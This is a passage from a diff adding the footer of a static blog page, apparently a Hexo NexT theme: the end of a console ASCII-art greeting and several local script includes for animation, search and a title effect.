+.       u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$      .
+.       $$$$$$$$$$""""           ""$$$$$$$$$$$"     .
+.        "$$$$$"                      ""$$$$""      .
+.          $$$"                         $$$$"       .
+.                                                   .
+.               Welcome to Console ;)               .
+. . . . . . . . . . . . . . . . . . . . . . . . . . .`,"color:#9acc14; background:black; font-family: monospace");
+</script>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
+
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
